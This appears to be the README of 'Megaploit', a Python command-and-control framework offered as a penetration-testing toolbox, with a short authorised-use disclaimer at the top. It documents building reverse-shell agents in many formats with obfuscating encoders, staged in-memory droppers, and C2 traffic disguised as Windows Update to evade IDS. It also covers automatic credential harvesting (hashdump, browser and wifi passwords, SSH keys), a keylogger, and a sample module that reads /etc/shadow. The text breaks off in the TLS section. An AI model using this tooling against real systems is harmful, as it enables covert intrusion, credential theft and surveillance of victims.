# Megaploit

**Professional C2 Framework & Security Research Toolbox · v3.0.0**

> **For authorised security research and penetration testing only.**  
> You must have explicit written permission before using this tool against any system.  
> Misuse is illegal and unethical. The authors accept no liability.

[![CI](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
[![CodeQL](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/codeql-analysis.yml)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://python.org)
[![License](https://img.shields.io/github/license/Josefifir/Megaploit)](LICENSE)

---

## Table of Contents

1. [What is Megaploit](#what-is-megaploit)
2. [v3.0 Changelog](#v30-changelog)
3. [Architecture](#architecture)
4. [Requirements](#requirements)
5. [Installation](#installation)
6. [Quick Start](#quick-start)
7. [Server Console](#server-console)
   - [Global Commands](#global-commands)
   - [Module System](#module-system)
   - [Payload Builder](#payload-builder)
   - [Session Commands](#session-commands)
   - [Operations Commands](#operations-commands)
8. [Toolbox](#toolbox)
9. [Plugin System](#plugin-system)
10. [Module System](#module-system-1)
    - [Built-in Scanner Modules](#built-in-scanner-modules)
    - [Writing a Module](#writing-a-module)
    - [AgentModule — Session-Bound Post Modules](#agentmodule--session-bound-post-modules)
11. [Payload Builder](#payload-builder-1)
12. [AutoRunScript](#autorunscript)
13. [Post-Exploitation Pipeline](#post-exploitation-pipeline)
14. [Malleable C2 Profile](#malleable-c2-profile)
15. [WebSocket Transport](#websocket-transport)
16. [Jobs System](#jobs-system)
17. [Credential Store](#credential-store)
18. [Reporting](#reporting)
19. [Web Dashboard](#web-dashboard)
20. [Multi-Operator RPC](#multi-operator-rpc)
21. [Go Agent](#go-agent)
22. [Staged Delivery](#staged-delivery)
23. [Security Model](#security-model)
24. [Wire Protocol](#wire-protocol)
25. [Directory Layout](#directory-layout)
26. [Contributing](#contributing)

---

## What is Megaploit

Megaploit is a modular, extensible **Command & Control (C2) framework** and **penetration testing toolbox** written in Python 3.10+. It is designed as a serious alternative to Metasploit for Python-native engagements.

**Core capabilities:**

| Capability | Description |
|---|---|
| **Multi-session C2** | Unlimited simultaneous reverse-shell agents; `use <id>` to switch |
| **AES-256-GCM encrypted transport** | Per-session encrypted channel with sequence numbers and replay protection |
| **WebSocket transport** | HTTP-upgrade WebSocket framing for firewall evasion (port 80/443) |
| **Metasploit-style module system** | `auxiliary`, `exploit`, `post`, `payload` modules with options lifecycle |
| **AgentModule base class** | Session-bound post-exploitation modules with built-in `_send`, `_upload`, `_download` |
| **8 built-in scanner modules** | TCP port scan, SMB enum, HTTP probe, SSH banner, DNS, ICMP sweep, UDP, banner grab |
| **13-format payload builder** | py / ps1 / hta / vba / sh / bat / exe / elf / **go_exe / go_elf** / oneliner variants + encoder pipeline |
| **Go agent build integration** | `payload go_exe` / `payload go_elf` — compile Go agent via `go build` with ldflags injection |
| **Post-exploitation pipeline** | Named collection profiles (`basic`, `creds`, `recon`, `network`, `full`) auto-run on every session |
| **Malleable C2 profile** | YAML traffic shaping — URI rotation, headers, User-Agent, sleep/jitter, metadata encoding |
| **203-tool toolbox** | Install any GitHub tool in any language; auto-build, update, healthcheck, audit |
| **Plugin system** | TOML plugins add new commands without Python |
| **AutoRunScript** | Auto-run commands on new sessions per platform/tag |
| **Background jobs** | Submit callables to run in daemon threads; list/kill from CLI |
| **SQLite credential + loot DB** | Hosts, services, creds, notes, loot, jobs, engagements — nmap XML import |
| **Web dashboard** | Flask SSE live dashboard at `http://127.0.0.1:8080` |
| **Multi-operator JSON-RPC** | TCP JSON-RPC 2.0 server for team operations and shared notes/chat |
| **Staged payload delivery** | Stage-0 dropper → StagingServer → in-memory stage-1 execution (HMAC-authenticated) |
| **Go agent** | Standalone compiled EXE/ELF with AES-GCM, HMAC, TLS — no Python on target |
| **HTML/JSON reports** | One-command engagement report with sessions, creds, loot, notes |

---

## v3.0 Changelog

### New in v3.0

#### AgentModule — Session-Bound Post Modules (`megaploit/modules/base.py`)
- `AgentModule` subclass of `Module` — base class for all post-exploitation modules
- Built-in helpers: `_send(cmd)`, `_shell(cmd)`, `_upload(local, remote)`, `_download(remote, local)`
- `self.session` attribute set automatically by the console before `run()`
- Zero boilerplate: write a post module in ~10 lines

#### Post-Exploitation Pipeline (`megaploit/core/pipeline.py`)
- `Pipeline` class wrapping `AutoRunScript` with named collection profiles
- Built-in profiles: `basic`, `creds`, `recon`, `network`, `full`
- `pipeline enable <profile>` / `pipeline disable <profile>` — toggle at runtime
- All active profiles run automatically on every new session (deduplicated)
- `pipeline status` / `pipeline list` / `pipeline reload` CLI commands

#### Malleable C2 Profile (`megaploit/core/profile.py`)
- `C2Profile` dataclass — YAML/JSON config for traffic shaping
- URI path rotation (`next_uri()`, `uri_cycle()`)
- Sleep + jitter intervals (`sleep_with_jitter()`, `wait()`)
- HTTP header sets — User-Agent, Host, Accept, etc.
- Metadata encoding location: header / URI / body
- `load_profile(path)` — load from YAML file (PyYAML optional, falls back to JSON)

#### WebSocket Transport (`megaploit/core/protocol.py`)
- `WsTransport` class — full RFC 6455 WebSocket implementation over raw TCP
- HTTP Upgrade handshake (server-side and client-side)
- Binary frame send/recv, client-side masking, ping/pong, CLOSE frame
- Transparent layering: use alongside the existing AES-GCM protocol

#### Go Agent Build Integration (`megaploit/payload/builder.py`)
- Two new `OutputFormat` values: `go_exe` (Windows) and `go_elf` (Linux/macOS)
- `payload go_exe --out agent.exe` — cross-compile Go agent for Windows
- `payload go_elf --out agent_linux` — compile Go agent for Linux
- Config injected via `-ldflags "-X main.LHOST=… -X main.PORT=… -X main.SECRET=…"`
- Graceful failure when `go` is not in PATH

#### C-remote-shell Integration (`megaploit/payload/builder.py`, `megaploit/core/c_probe.py`)
- New `OutputFormat.C_EXE` — builds the hardened Windows C client EXE
- `generate_c <lhost> <lport>` operator command embeds key/IP/port at compile time
- `c_probe` runs a **46-signal compliance check** before every build (33 required)
- Source layout auto-discovered — no subdirectory names hardcoded in Python
- C-exclusive verbs (`forceOff()`, `blueScreen()`) auto-detected from `strncmp()` calls
- `commands.py` auto-registers operator commands for C-exclusive verbs at startup
- Adding a new `strncmp("verb()", ...)` in `shell.c` is the only step needed

#### Stage-0 Command Fix & Enhancements (`megaploit/server/cli.py`)
- Fixed broken `_cmd_stage0` that called non-existent `generate_dropper()` method
- Now correctly calls `generate_stage0(lhost, port, key_hex, use_tls, minimal)`
- `stage0 generate --start` — also launches `StagingServer` in the background
- `stage0 status` — check if staging server is listening
- `stage0 stop` — stop the staging server
- `--minimal` flag — compact single-file dropper for embedding in macros

### Previous Systems (v2.x)

#### Module System (`megaploit/modules/`)
- `Module` base class with full options lifecycle (`_opt`, `set`, `validate`, `run`, `check`)
- `ModuleRegistry` auto-discovers Python files in `modules/exploits/`, `modules/auxiliary/`, `modules/post/`, `modules/payloads/`
- `use <module/path>` loads a module from the global prompt
- `show modules [query]` — searchable module catalogue

#### Payload Builder (`megaploit/payload/`)
- 13 output formats (added `go_exe`, `go_elf`)
- 10-encoder pipeline: `xor_rolling`, `rc4`, `b64gzip`, `rev`, `zlib_b64`, `rot13_src`, `null_pad`, `comment_spam`, `varname_rand`, `ps1_concat`

#### AutoRunScript (`megaploit/core/autorun.py`)
- Reads `~/.megaploit_autorun.json`; resolves commands per `global` / `windows` / `linux` / `darwin` / `tags`

#### Jobs Engine, SQLite DB, HTML Reports, Web Dashboard, Multi-Operator RPC, Go Agent
- All fully operational — see individual sections below

---

## Architecture

```
Megaploit-main/
├── server.py                    ← Operator entry-point
├── agent.py                     ← Python agent payload
├── secret.key                   ← Shared HMAC secret
├── cert.pem / key.pem           ← TLS certificates (optional)
├── requirements.txt
├── install.sh
│
├── plugins/                     ← TOML plugin files
├── tools/                       ← Toolbox: git clones + tools.json
├── loot/                        ← All collected data + audit.log
│
├── tests/                       ← Test suite (pytest · 282 tests)
│
└── megaploit/
    ├── core/
    │   ├── config.py            ← Shared constants
    │   ├── crypto.py            ← HMAC-SHA256 auth
    │   ├── protocol.py          ← AES-256-GCM transport v2 + WsTransport
    │   ├── autorun.py           ← AutoRunScript engine
    │   ├── pipeline.py          ← Post-exploitation pipeline (NEW v3)
    │   ├── profile.py           ← Malleable C2 profile (NEW v3)
    │   ├── jobs.py              ← Background job manager
    │   └── staging.py           ← Staged payload delivery
    │
    ├── server/
    │   ├── cli.py               ← Interactive console (3,100+ lines)
    │   ├── commands.py          ← 45+ session command dispatchers
    │   ├── listener.py          ← TCP accept + TLS + auth + rate limiter
    │   └── session.py           ← Session dataclass with loot paths
    │
    ├── agent/
    │   ├── connection.py        ← Connect-back loop
    │   ├── handlers.py          ← All victim-side handlers
    │   ├── keylogger.py         ← pynput keystroke logger
    │   ├── shell.py             ← recv → handle → respond loop
    │   └── go_agent/
    │       ├── main.go          ← Standalone Go agent (NEW v3 — build integration)
    │       └── go.mod
    │
    ├── modules/
    │   ├── base.py              ← Module + AgentModule base classes (NEW v3)
    │   ├── registry.py          ← Auto-discovery registry
    │   ├── auxiliary/           ← 8 scanner modules
    │   ├── exploits/            ← (extensible)
    │   ├── post/                ← (extensible — use AgentModule)
    │   └── payloads/            ← (extensible)
    │
    ├── payload/
    │   ├── builder.py           ← 13-format builder + Go compilation (NEW v3)
    │   └── encoders.py          ← 10-encoder pipeline
    │
    ├── db/
    │   └── database.py          ← SQLite engine
    │
    ├── reporting/
    │   └── report.py            ← HTML + JSON report generator
    │
    ├── web/
    │   ├── app.py               ← Flask dashboard + SSE + REST API
    │   └── rpc.py               ← Multi-operator JSON-RPC 2.0 server
    │
    ├── streaming/               ← MJPEG desktop + webcam streams
    ├── toolbox/                 ← 203-tool installer/runner/updater
    └── plugins/                 ← TOML plugin loader + runner
```

---

## Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ preferred |
| `git` on PATH | For toolbox clone/update |
| Linux / macOS / Windows | Full support |

### Python Dependencies

```bash
pip install -r requirements.txt
```

**Optional (unlocks extra capabilities):**

| Package | Unlocks |
|---|---|
| `cryptography` | AES-256-GCM transport encryption (strongly recommended) |
| `flask` | Web dashboard (`web start`) |
| `impacket` | Full SMB share enumeration in `smb_share_enum` module |
| `dnspython` | DNS record types beyond A/AAAA in `dns_resolver` module |
| `pyinstaller` | `payload exe` / `payload elf` binary compilation |
| `pyyaml` | Full YAML support for C2 profiles (falls back to JSON) |
| `weasyprint` | PDF export from HTML reports |
| `go` (toolchain) | `payload go_exe` / `payload go_elf` Go agent compilation |

---

## Installation

### Automated (Linux)

```bash
sudo bash install.sh
```

### Manual

```bash
git clone https://github.com/JosephFrankFir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
# Optional extras:
pip install cryptography flask impacket dnspython pyinstaller pyyaml
```

---

## Quick Start

**1 — Generate a shared secret:**

```bash
python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
```

**2 — Start the server:**

```bash
python3 server.py -lh 192.168.1.10 -p 4444
```

**3 — Generate and deploy the Python agent:**

```
megaploit > set lhost 192.168.1.10
megaploit > set port 4444
megaploit > generate
```

Copy `agent.py`, `secret.key`, and the `megaploit/` directory to the target, then run `python3 agent.py`.

**4 — Interact with a session:**

```
megaploit [1] » use 1
megaploit session(1) » sysinfo
megaploit session(1) » browser_creds
megaploit session(1) » back

megaploit [1] » use auxiliary/scanner/tcp_port
  setopt RHOSTS 10.0.0.0/24
  setopt PORTS  22,80,443,8080
  run

megaploit [1] » payload ps1 --out dropper.ps1
megaploit [1] » payload go_exe --out agent.exe
megaploit [1] » pipeline enable creds
megaploit [1] » stage0 generate --start --out dropper.py
megaploit [1] » web start
megaploit [1] » report html pentest_report.html
```

---

## Server Console

```bash
python3 server.py -lh <callback-ip> -p <port> [options]

  -lh, --lhost       IP the agent connects back to (required)
  -p,  --port        TCP port (required)
  -rh, --rhost       Bind IP (default: 0.0.0.0)
  --cert             SSL certificate PEM — enables TLS 1.2+
  --key              SSL private key PEM
  --secret           Path to secret.key (default: secret.key)
  --allow-ip <IP>    Allowlisted source IP (repeat for multiple)
  --auto-update      Auto-apply tool updates in background
```

### Global Commands

| Command | Description |
|---|---|
| `sessions` | List active sessions (ID, IP, OS, hostname, tag, uptime) |
| `use <id>` | Enter session interaction loop |
| `use <module/path>` | Load a module (e.g. `use auxiliary/scanner/tcp_port`) |
| `generate [-c] [--tls]` | Patch agent with LHOST/PORT; `-c` byte-compile |
| `set <option> <value>` | Set lhost / port / cert / key / auto_update |
| `show modules [query]` | Browse loaded module catalogue |
| `run` | Execute active module |
| `check` | Run module pre-flight check |
| `info [module]` | Show module details |
| `setopt <OPT> <val>` | Set option on active module |
| `options` | Show active module options table |
| `back` | Clear active module (global context) |
| `broadcast <cmd>` | Run shell command on ALL active sessions |
| `payload <format> [opts]` | Build payload (see [Payload Builder](#payload-builder-1)) |
| `stage0 generate [opts]` | Generate stage-0 dropper (+ optional `--start`) |
| `stage0 status\|stop` | Manage the staging server |
| `pipeline enable\|disable <profile>` | Toggle post-exploitation collection profile |
| `pipeline status\|list\|reload` | Manage pipeline profiles |
| `web start\|stop\|status` | Manage the web dashboard |
| `rpc start\|stop\|status\|operators` | Manage multi-operator RPC server |
| `jobs list\|kill <id>` | Background job management |
| `creds show\|search\|export\|clear` | Credential store |
| `report html\|json [output]` | Generate engagement report |
| `autorun show\|reload\|save-default\|test <id>` | AutoRunScript config |
| `toolbox …` | Tool installer (see [Toolbox](#toolbox)) |
| `plugins …` | Plugin management |
| `engagement name\|desc\|show` | Set engagement metadata |
| `loot browse\|export\|clear` | Loot file browser |
| `history [n\|search <q>\|clear]` | Command history |
| `alias <name> <cmd>` / `unalias` / `aliases` | Command aliases |
| `clear` | Clear terminal |
| `exit` | Graceful shutdown |

### Module System

```
megaploit [1] » use auxiliary/scanner/tcp_port
megaploit [1] » setopt RHOSTS 10.0.0.0/24
megaploit [1] » setopt PORTS 22,80,443,3306,8080
megaploit [1] » run
[*] Scanning 254 host(s), 5 port(s)  (100 threads)
[+] 10.0.0.1:80 open
[+] 10.0.0.5:22 open
...
megaploit [1] » back
```

### Payload Builder

```
megaploit [1] » payload help

  Formats: py  ps1  hta  vba  sh  bat  raw  exe  elf  go_exe  go_elf  oneliner_py  oneliner_ps1

  Options:
    --out <file>       Write to file (default: print to terminal)
    --tls              Agent uses TLS
    --encoder <name>   Apply encoder (repeatable for chaining)
    --upx              UPX-pack binary (exe/elf only)

megaploit [1] » payload ps1 --out agent.ps1
megaploit [1] » payload exe --out agent.exe --upx
megaploit [1] » payload go_exe --out agent.exe          # Go-compiled Windows EXE
megaploit [1] » payload go_elf --out agent_linux        # Go-compiled Linux ELF
megaploit [1] » payload py --encoder comment_spam --encoder varname_rand --out obf.py
megaploit [1] » payload oneliner_ps1
```

### Session Commands

See [CLI Reference](docs/CLI_REFERENCE.md) for the full list of 60+ session commands.

### Operations Commands

```
megaploit [1] » pipeline enable creds      # auto-collect creds on every new session
megaploit [1] » pipeline enable recon
megaploit [1] » pipeline status

megaploit [1] » stage0 generate --start    # generate dropper + start staging server
megaploit [1] » stage0 generate --minimal --out dropper.py
megaploit [1] » stage0 status
megaploit [1] » stage0 stop

megaploit [1] » jobs list
megaploit [1] » jobs kill <id>

megaploit [1] » creds show
megaploit [1] » creds search admin

megaploit [1] » report html pentest.html

megaploit [1] » autorun show
megaploit [1] » autorun test 1

megaploit [1] » web start --port 8080
megaploit [1] » rpc start --port 7777
megaploit [1] » rpc operators
```

---

## Toolbox

Install any GitHub repository as a first-class Megaploit tool in any language. Tools persist in `tools/tools.json`.

```
megaploit > toolbox install <repo_url> <name> [desc] [--tags t1,t2]
megaploit > toolbox catalogue [query]       # browse 203-tool catalogue
megaploit > toolbox list
megaploit > toolbox search <query>
megaploit > toolbox info <name>
megaploit > toolbox update <name>
megaploit > toolbox rebuild <name>          # re-build without git pull
megaploit > toolbox remove <name>
megaploit > toolbox healthcheck [name]
megaploit > toolbox audit <name>
megaploit > toolbox plan <name|url>         # dry-run install plan
```

**Supported build languages:** Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++, Binary.

---

## Plugin System

Drop a `.toml` (or `.json`) file into `plugins/`. Megaploit loads it automatically at startup and hot-reloads it whenever the file changes.

### Command kinds

| `kind` | What runs | Required field |
|---|---|---|
| `"local"` | Shell command on the **operator** machine | `shell` |
| `"session"` | Shell command sent to the active **agent** | `shell` |
| `"python"` | Python function, dotted import path | `handler` |
| `"native"` | C or C++ source file — compiled on demand, cached by mtime | `source_file` |

### Placeholders (available in `shell`, `source_file`, and `compiler_flags`)

```
{lhost}            operator LHOST setting
{port}             operator PORT setting
{session_ip}       active session IP
{session_id}       active session numeric ID
{session_tag}      operator tag for the session
{session_os}       session OS name
{session_hostname} session hostname
{session_username} session username
{arg0} … {argN}    positional CLI args
{joined_args}      all args joined with a space
{key:-default}     use default when key is empty
```

### Example — local shell command

```toml
[plugin]
name        = "recon"
version     = "1.0.0"
description = "Quick recon commands"

[[command]]
name          = "portscan"
kind          = "local"
description   = "nmap scan against the active session IP"
usage         = "portscan [ports]"
shell         = "nmap -sV -p {arg0:-1-1000} {session_ip}"
min_args      = 0
timeout       = 120
output_format = "raw"
retry         = 1
```

### Example — Python handler

```toml
[[command]]
name          = "mycheck"
kind          = "python"
description   = "Custom Python check"
handler       = "myplugin.checks.run_check"
usage         = "mycheck <target>"
min_args      = 1
output_format = "json"
```

```python
# myplugin/checks.py
from megaploit.plugins.schema import PluginContext

def run_check(args: list[str], ctx: PluginContext) -> str:
    ctx.emit(f"[*] Checking {args[0]} …")
    return '{"result": "ok"}'
```

### Example — native C / C++ command

```toml
[[command]]
name           = "tcpprobe"
kind           = "native"
description    = "TCP connect-probe from the operator machine (C++ binary)"
usage          = "tcpprobe <host> <port> [timeout_secs]"
source_file    = "plugins/myplugin/probe.cpp"
compiler_flags = "-std=c++17 -O2"
min_args       = 2
max_args       = 3
timeout        = 15
dangerous      = false
```

The runner:
1. Finds the first available C/C++ compiler on `$PATH` (`gcc`/`g++`, `clang`/`clang++`, `cc`/`c++`).
2. Compiles `source_file` to a cached binary (name includes an 8-char source-path hash to prevent collisions).
3. Skips recompilation when the binary is newer than the source (mtime, like `make`).
4. Passes expanded `{arg0}…{argN}` as `argv[1..N]` and streams stdout/stderr back to the console.
5. Recompiles automatically when the hot-reload watcher detects a source change.

A complete single-header C/C++ SDK (`megaploit_protocol.h`) and a working example plugin are provided in [`plugins/native_sdk/`](plugins/native_sdk/).

### Writing a native agent in C, C++, or C\#

Any language can connect to the C2 server as an agent as long as it follows the wire protocol exactly. The critical rules (violating any one causes the Python server to silently reject the client):

| Rule | Detail |
|---|---|
| **4-byte length prefix** | Big-endian `uint32`, frames every message |
| **8-byte sequence stamp** | Big-endian `uint64`, prepended to every plaintext before encryption; starts at 1, strictly monotonic |
| **Replay protection** | Server rejects any message whose sequence number ≤ the last accepted one |
| **JSON string payload** | The JSON must be a quoted *string* value — not an object or array — e.g. `"ls -la"` or `"[+] done"` |
| **AES-256-GCM layout** | `nonce (12 bytes) ‖ ciphertext ‖ tag (16 bytes)` — nonce comes first |
| **Protocol handshake** | Server sends `0x4D` ('M') for v2 encrypted, agent echoes it back; if it matches and both have the key, encryption is active |
| **HMAC auth** | Server sends 16 random bytes; agent replies with `HMAC-SHA256(key, challenge)` |
| **TLS receive buffer — any single record** | Allocate **16,384 bytes** minimum (RFC 5246 §6.2.1 hard cap per record) |
| **TLS receive buffer — server handshake flight** | Allocate **8,192 bytes**; the coalesced `ServerHello + Certificate (RSA-4096 ≈ 1,900 B) + ServerKeyExchange (ECDHE sig ≈ 400 B) + ServerHelloDone` fits comfortably |
| **TLS send buffer — ClientHello** | Allocate **1,024 bytes**; generous for all extensions the server requires |
| **Post-handshake C2 app buffer** | **65,536 bytes** — matches `config.py:BUFFER_SIZE` (64 KiB); raised from 4 KiB to handle large plugin output without fragmentation |
| **Per-frame allocation ceiling** | **268,435,456 bytes (256 MiB)** — matches `config.py:MAX_PLUGIN_MSG_SIZE`; reject any frame header claiming more than this before allocating, to prevent memory exhaustion |

See [`megaploit/core/protocol.py`](megaploit/core/protocol.py) for the authoritative Python implementation and [`plugins/native_sdk/megaploit_protocol.h`](plugins/native_sdk/megaploit_protocol.h) for the C/C++ equivalent.

### Plugin management commands

```
plugins list                        list all loaded plugins
plugins reload                      reload all plugins from disk
plugins enable  <name>              re-enable a disabled plugin
plugins disable <name>              disable (unregister its commands)
plugins load    <path|url|zip>      load a plugin file or archive
plugins watcher on|off              toggle hot-reload watcher
plugins info    <name>              detailed plugin metadata
plugins search  <query>             search by name / description / tags
plugins deps    install             pip-install all missing dependencies
```

---

## Module System

### Built-in Scanner Modules

| Module path | Description |
|---|---|
| `auxiliary/scanner/tcp_port` | Multi-threaded TCP connect scan |
| `auxiliary/scanner/smb_share_enum` | SMB share enumeration |
| `auxiliary/scanner/http_header_probe` | HTTP/S header fingerprinting |
| `auxiliary/scanner/ssh_banner_grab` | SSH version banner grab |
| `auxiliary/scanner/dns_resolver` | Bulk DNS lookups |
| `auxiliary/scanner/icmp_ping_sweep` | ICMP sweep + TCP fallback |
| `auxiliary/scanner/udp_scanner` | UDP with protocol probes |
| `auxiliary/scanner/banner_grabber` | Generic TCP banner grab |

### Writing a Module

```python
from megaploit.modules.base import Module, ModuleType, OptionType

class MyScanner(Module):
    name        = "auxiliary/scanner/my_scanner"
    description = "Does something useful"
    module_type = ModuleType.AUXILIARY
    author      = "your-name"

    def _define_options(self) -> None:
        self._opt("RHOSTS", OptionType.STRING, required=True,
                  description="Target IP or CIDR")

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()
        self._emit(f"[*] Scanning {self.get('RHOSTS')}")
        # ... your logic ...
        self._ok("Found something", host=self.get("RHOSTS"))
        return self.results

MODULE = MyScanner
```

### AgentModule — Session-Bound Post Modules

`AgentModule` is a `Module` subclass that adds built-in helpers for interacting with an active agent session. Every future post-exploitation module costs ~10× less code to write.

```python
from megaploit.modules.base import AgentModule, ModuleType

class DumpShadow(AgentModule):
    name        = "post/linux/dump_shadow"
    description = "Read /etc/shadow and store as loot"
    module_type = ModuleType.POST
    platform    = ["linux"]

    def run(self, session=None):
        self.validate()
        sess = session or self.session
        if sess is None:
            raise ModuleError("No session — use: set SESSION <id>")
        output = self._send("shell cat /etc/shadow", sess)
        if output.strip():
            self._ok("shadow file retrieved", shadow=output)
        else:
            self._fail("empty output from /etc/shadow")
        return self.results

MODULE = DumpShadow
```

**Available helpers on `AgentModule`:**

| Method | Description |
|---|---|
| `self.session` | Active session (set by console before `run()`) |
| `_send(cmd, session=None)` | Send command, return output string |
| `_shell(cmd, session=None)` | Alias for `_send` |
| `_upload(local, remote, session=None)` | Transfer file to target |
| `_download(remote, local, session=None)` | Pull file from target |

---

## Payload Builder

```
megaploit [1] » payload py --out agent.py
megaploit [1] » payload ps1 --out agent.ps1
megaploit [1] » payload exe --out agent.exe
megaploit [1] » payload go_exe --out agent_win.exe      # Go agent for Windows
megaploit [1] » payload go_elf --out agent_linux        # Go agent for Linux
megaploit [1] » payload c_exe --out agent.exe           # C-remote-shell Windows EXE
megaploit [1] » payload oneliner_py

# Encoder chaining:
megaploit [1] » payload py --encoder comment_spam --encoder varname_rand --out obf.py
```

All formats embed LHOST, PORT, TLS flag, and HMAC key automatically from the current console settings.

**Go formats** require `go` on PATH. Config is injected at link time via `-ldflags`, so no source patching is needed. Cross-compilation works naturally via `GOOS`/`GOARCH`.

**C format** (`c_exe`) requires MSVC (`cl.exe`) or MinGW (`x86_64-w64-mingw32-gcc`) on PATH. Before compiling, `c_probe` runs a 46-signal compliance check against the C source tree and aborts if the security standard is not met. The secret key is embedded as a hex array — no file needed on the target.

See [docs/PAYLOAD_BUILDER.md](docs/PAYLOAD_BUILDER.md) for the full reference.

---

## AutoRunScript

Create `~/.megaploit_autorun.json`:

```json
{
  "global":  ["sysinfo"],
  "windows": ["os_info", "installed_software", "ps"],
  "linux":   ["os_info", "find_suid", "env", "users"],
  "darwin":  ["os_info", "startup_items", "users"],
  "tags": {
    "dc":          ["hashdump", "users", "scheduled_tasks"],
    "workstation": ["browser_creds", "wifi_passwords", "ps"]
  }
}
```

---

## Post-Exploitation Pipeline

The pipeline extends AutoRunScript with named **collection profiles** that bundle sets of commands. Profiles run automatically on every new session in addition to the AutoRunScript baseline.

```
megaploit [1] » pipeline list

  ○ basic
  ○ creds
  ○ full
  ○ network
  ○ recon

megaploit [1] » pipeline enable creds
[+] Pipeline profile creds enabled — active on next session.

megaploit [1] » pipeline enable recon
megaploit [1] » pipeline status

  ╭─── Post-Exploitation Pipeline ───╮
  │ Active profiles   creds, recon   │
  │ Available         basic creds …  │
  ╰───────────────────────────────────╯
```

**Built-in profiles:**

| Profile | Commands |
|---|---|
| `basic` | sysinfo, whoami, pwd, env |
| `creds` | hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault |
| `recon` | ps, installed_software, scheduled_tasks, users, os_info |
| `network` | arp, netstat, ifconfig, hosts_file |
| `full` | All of the above |

```
megaploit [1] » pipeline disable creds
megaploit [1] » pipeline reload          # reload autorun config from disk
```

See [docs/PIPELINE.md](docs/PIPELINE.md) for the Python API.

---

## Malleable C2 Profile

Shape the network appearance of C2 traffic to blend into allowed traffic and evade IDS/IPS.

**Create a profile file** (`profiles/windows_update.yaml`):

```yaml
name: "WindowsUpdate"
description: "Mimic Windows Update traffic"

sleep:      60
jitter_max: 15

uri_paths:
  - "/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab"
  - "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"

request_headers:
  Host: "update.microsoft.com"
  User-Agent: "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.21"
  Accept: "*/*"

response_headers:
  Content-Type: "application/octet-stream"
  Server: "Microsoft-IIS/10.0"
```

**Python API:**

```python
from megaploit.core.profile import load_profile

profile = load_profile("profiles/windows_update.yaml")
uri     = profile.next_uri()                 # rotate URIs
headers = profile.build_http_headers()       # merged request headers
time.sleep(profile.sleep_with_jitter())      # sleep + random jitter
```

See [docs/C2_PROFILE.md](docs/C2_PROFILE.md) for the full reference.

---

## WebSocket Transport

Agents can communicate over port 80/443 while appearing as normal browser traffic — transparent to firewalls performing deep-packet inspection.

```python
from megaploit.core.protocol import WsTransport

# Server side:
ws = WsTransport(conn, server_side=True)
ws.handshake()
data = ws.recv()
ws.send(b"response")

# Agent/client side:
ws = WsTransport(conn, server_side=False)
ws.handshake(host="c2.example.com", path="/updates")
ws.send(b"hello")
data = ws.recv()
```

The existing AES-256-GCM `send_msg`/`recv_msg` layer stacks transparently on top.

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full protocol diagram.

---

## Jobs System

```
megaploit [1] » jobs list
  ID      Name                          Status      Started
  ─────────────────────────────────────────────────────────
  a1b2c3  tcp_scan_10.0.0.0/24         running     14:32:01Z

megaploit [1] » jobs kill a1b2c3
```

---

## Credential Store

All credentials captured by `hashdump`, `browser_creds`, `wifi_passwords`, `cred_vault`, `ssh_harvest` are auto-saved to the SQLite database.

```
megaploit [1] » creds show
megaploit [1] » creds search admin
megaploit [1] » creds export creds.json
megaploit [1] » creds clear
```

---

## Reporting

```
megaploit [1] » report html pentest_report.html
megaploit [1] » report json pentest_report.json
```

The HTML report is a **single self-contained file** including: summary stats, sessions table, credentials table (redacted), loot listing, per-session notes.

---

## Web Dashboard

```
megaploit [1] » web start --port 8080
[+] Web dashboard started: http://127.0.0.1:8080/
[*] API key (X-API-Key header): abc123def456
```

**REST API:** `GET /api/sessions` · `/api/creds` · `/api/jobs` · `/api/loot` · `/api/modules` · `POST /api/sessions/<id>/cmd` · `GET /events` (SSE)

See [docs/WEB_DASHBOARD.md](docs/WEB_DASHBOARD.md) for the full API reference.

---

## Multi-Operator RPC

```
megaploit [1] » rpc start --port 7777
megaploit [1] » rpc operators
  alice     10.0.0.2   authed
  bob       10.0.0.3   authed
```

Connect any JSON-RPC 2.0 TCP client. Methods: `auth`, `sessions.list/get`, `session.cmd`, `chat.send/history`, `notes.add/list`, `creds.list`, `jobs.list`, `operators.list`.

See [docs/WEB_DASHBOARD.md](docs/WEB_DASHBOARD.md) for the full RPC reference.

---

## Go Agent

A standalone compiled binary — no Python runtime required on the target.

```
megaploit [1] » payload go_exe --out agent.exe      # Windows
megaploit [1] » payload go_elf --out agent_linux    # Linux
```

Or build manually:

```bash
cd megaploit/agent/go_agent
go build -o agent_go -ldflags="-s -w" .
GOOS=windows GOARCH=amd64 go build -o agent_go.exe -ldflags="-s -w" .
```

Features: AES-256-GCM, HMAC-SHA256 auth, optional TLS, auto-reconnect with jitter, cross-platform.

---

## Staged Delivery

```
megaploit [1] » stage0 generate --start
[+] Stage-0 dropper generated  (prints to terminal)
[+] Staging server listening on 0.0.0.0:4445

megaploit [1] » stage0 generate --minimal --out dropper.py
[+] Stage-0 dropper written to dropper.py

megaploit [1] » stage0 status
[+] Staging server running on port 4445

megaploit [1] » stage0 stop
[+] Staging server stopped.
```

The stage-0 dropper:
1. Connects to the staging port (default: main port + 1)
2. Authenticates with HMAC-SHA256
3. Sends the magic byte `"S"` to signal stage mode
4. Receives gzip-compressed stage-1 agent source
5. Executes it in-memory — no disk write

---

## Security Model

### Authentication
1. Server sends random 16-byte challenge
2. Agent responds with `HMAC-SHA256(secret_key, challenge)`
3. Server verifies with `hmac.compare_digest()` (constant-time)

### Transport Encryption (v2)
- **AES-256-GCM** per message, random 12-byte IV
- **Sequence numbers** — replay attacks detected and rejected
- XOR-CTR fallback when `cryptography` is absent

### TLS (recommended)

```bash
